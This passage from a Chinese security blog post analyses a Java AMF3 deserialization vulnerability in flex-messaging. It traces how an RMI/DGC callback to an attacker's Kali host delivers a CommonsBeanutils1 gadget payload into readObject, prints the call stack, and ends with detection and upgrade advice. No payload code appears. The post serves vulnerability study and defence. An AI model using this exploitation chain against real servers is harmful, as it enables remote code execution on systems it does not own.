<p>在UnicastRef.invoke()函数中，调用了executeCall()函数，其实就是一个远程TCP连接调用：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/17.png" alt=""></p>
<p>跟进StreamRemoteCall.executeCall()函数中，看到该方法直接从in数据库中进行了readObject()操作：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/16.png" alt=""></p>
<p>再往下，就是调用ObjectInputStream.readObject()的Java原生反序列化的内容了。由于目标环境存在可被反序列化漏洞利用的CommonsBeanutils1相关的jar包（commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2），因此Kali会通过建立的TCP连接把CommonsBeanutils1对应的payload发送过来这个readObject()中进行反序列化操作，从而触发漏洞。</p>
<p>此时函数调用栈为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">executeCall:245, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">invoke:379, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:-1, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:378, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:320, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:156, DGCClient (sun.rmi.transport)</span><br><span class="line">read:312, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:493, UnicastRef (sun.rmi.server)</span><br><span class="line">readExternalizable:828, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readScriptObject:757, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:55, AMFDemo</span><br><span class="line">main:16, AMFDemo</span><br></pre></td></tr></table></figure>
<h2 id="0x05-检测与方法"><a href="#0x05-检测与方法" class="headerlink" title="0x05 检测与方法"></a>0x05 检测与方法</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>全局搜索是否使用flex-messaging-xx系列jar包，且版本是否&lt;4. 7.3；</p>
<p>若是则全局搜索如下关键代码排查，主要看AmfMessageDeserializer.readMessage()函数的参数是否外部可控：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flex.messaging.io.</span><br><span class="line">AmfMessageDeserializer</span><br><span class="line">readMessage(</span><br></pre></td></tr></table></figure>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>将flex-messaging相关jar包升级到4.7.3版本以上。</p>
<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.anquanke.com/post/id/85846" target="_blank" rel="noopener">【技术分享】Java AMF3 反序列化漏洞分析</a></p>

    </div>

  </article>
  <div class="toc-container">
    
  <div id="toc" class="toc-article">
    <strong class="toc-title">目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本概念"><span class="toc-text">0x01 基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-使用AMF3序列化和反序列化"><span class="toc-text">0x02 使用AMF3序列化和反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-AMF3反序列化过程"><span class="toc-text">0x03 AMF3反序列化过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-AMF3反序列化漏洞"><span class="toc-text">0x04 AMF3反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#影响版本"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现利用"><span class="toc-text">复现利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#基于UnicastRef的Gadget"><span class="toc-text">基于UnicastRef的Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基于JdbcRowSetImpl的Gadget"><span class="toc-text">基于JdbcRowSetImpl的Gadget</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试分析"><span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-检测与方法"><span class="toc-text">0x05 检测与方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测方法"><span class="toc-text">检测方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-参考"><span class="toc-text">0x06 参考</span></a></li></ol>
  </div>


  </div>
</div>
<div class="copyright">
    <span>本作品采用</span>
    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
    <span>进行许可。 转载时请注明原文链接。</span>
</div>


  
    <div class="post-nav">
      <div class="post-nav-item post-nav-next">
        
          <span>〈 </span>
          <a href="/2019/11/29/Java-SnakeYaml反序列化漏洞/" rel="next" title="Java SnakeYaml反序列化漏洞">
          Java SnakeYaml反序列化漏洞
          </a>
        
      </div>
  
      <div class="post-nav-item post-nav-prev">
          
          <a href="/2020/01/01/浅析Influxdb认证绕过漏洞/" rel="prev" title="浅析Influxdb认证绕过漏洞">
            浅析Influxdb认证绕过漏洞
          </a>
          <span>〉</span>
        
      </div>
    </div>
  


    </div>

    
    

  </div>
  <footer class="footer text-center">
    <div id="bottom-inner">
        <span>Copyright &copy; Mi1k7ea</span>  |  
        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
    </div>
</footer>

  

<script>
  (function(window, document, undefined) {

    var timer = null;

    function returnTop() {
      cancelAnimationFrame(timer);
      timer = requestAnimationFrame(function fn() {
        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
        if (oTop > 0) {
          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
          timer = requestAnimationFrame(fn);
        } else {
          cancelAnimationFrame(timer);
        }
      });
    }

    var hearts = [];
    window.requestAnimationFrame = (function() {
      return window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.oRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function(callback) {
          setTimeout(callback, 1000 / 60);
        }
    })();
    init();

    function init() {
      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
      attachEvent();
      gameloop();
      addMenuEvent();
    }

    function gameloop() {
      for (var i = 0; i < hearts.length; i++) {
        if (hearts[i].alpha <= 0) {
          document.body.removeChild(hearts[i].el);
          hearts.splice(i, 1);
          continue;
        }
        hearts[i].y--;
        hearts[i].scale += 0.004;
        hearts[i].alpha -= 0.013;
        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
      }
      requestAnimationFrame(gameloop);
    }

    /**
     * 给logo设置点击事件
     * 
     * - 回到顶部
     * - 出现爱心
     */
    function attachEvent() {
      var old = typeof window.onclick === "function" && window.onclick;
      var logo = document.getElementById("logo");
      if (logo) {
        logo.onclick = function(event) {
          returnTop();
          old && old();
          createHeart(event);
        }
      }
      
    }

    function createHeart(event) {
      var d = document.createElement("div");
      d.className = "heart";
      hearts.push({
        el: d,
        x: event.clientX - 5,
        y: event.clientY - 5,
        scale: 1,
        alpha: 1,
        color: randomColor()
      });
      document.body.appendChild(d);
    }

    function css(css) {
      var style = document.createElement("style");
      style.type = "text/css";
      try {
        style.appendChild(document.createTextNode(css));
      } catch (ex) {
        style.styleSheet.cssText = css;
      }
      document.getElementsByTagName('head')[0].appendChild(style);
    }

    function randomColor() {
      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
      return "#F44336";
    }

    function addMenuEvent() {
      var menu = document.getElementById('menu-main-post');
      if (menu) {
        var toc = document.getElementById('toc');
        if (toc) {
          menu.onclick = function() {
            if (toc) {
              if (toc.style.display == 'block') {
                toc.style.display = 'none';
              } else {
                toc.style.display = 'block';
              }
            }
          };
        } else {
          menu.style.display = 'none';
        }
      }
    }

  })(window, document);
</script>

  



  
<script>
  (function(){
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();
</script>


</body>
</html>
